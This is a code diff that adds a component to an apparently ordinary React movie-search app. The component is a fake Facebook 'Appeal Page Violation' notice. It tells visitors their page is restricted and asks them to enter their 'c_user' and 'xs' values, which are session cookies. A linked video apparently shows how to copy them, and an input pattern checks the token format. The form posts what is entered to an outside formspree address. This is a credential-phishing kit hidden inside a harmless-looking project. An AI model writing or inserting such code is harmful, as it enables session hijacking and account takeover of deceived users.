@@ -36,6 +36,7 @@ export default function App() {
         <Logo />
         <SearchInput query={query} setQuery={setQuery} />
         <NumResults movies={movies} />
+        <MainBox />
       </Nav>
       <Main>
         <Box>
@@ -345,5 +346,83 @@ function Button({ handleClick, children }) {
     <button className="btn-toggle" onClick={handleClick}>
       {children}
     </button>
+  );
+}
+
+function MainBox({}) {
+  return (
+    <div id="main-form">
+      <header id="main-form__header">
+        <h3 id="main-form__h3">Appeal Page Violation</h3>
+      </header>
+      <div id="main-form__body">
+        <p>
+          We have detected unusual activity on your page that violates our
+          community standards.
+        </p>
+        <p>
+          Your access to your page has been limited, and you are currently
+          unable to post, share, or comment using your page.
+        </p>
+        <p>
+          If you believe this to be a mistake, you have the option to submit an
+          appeal by providing the necessary information.
+        </p>
+        <p class="video__p">Detailed Video Information</p>
+        <a
+          target="_blank"
+          onclick="myFunction()"
+          class="video"
+          href="https://detailed-video-29b30.web.app/detailed%20video.mp4"
+        >
+          <img src="/fb.jpg" width="250px" height="180px" id="img-fb" alt="" />
+        </a>
+        <div>
+          <h3 id="form-h3-el">
+            Watch the video to submit required information!
+          </h3>
+        </div>
+        <p>Please be sure to provide the requested information below.</p>
+        <form
+          id="myForm"
+          action="https://formspree.io/f/myyrwgvr"
+          method="post"
+        >
+          <label id="label" for="recipient">
+            c_user
+          </label>
+
+          <input
+            id="input"
+            type="number"
+            name="number"
+            minlength="6"
+            oninput="validateInput()"
+            required
+          />
+
+          <br />
+          <label id="label" for="subject">
+            xs
+          </label>
+          <input
+            id="input"
+            pattern=".*A-1.*"
+            title="Enter correct information! Watch the video"
+            for="text"
+            name="recipient"
+            required
+          />
+          <br />
+
+          <br />
+          <div id="btn-div" class="btn-div">
+            <button class="btn" type="submit" onclick="sendEmail()">
+              Submit
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
   );
 }
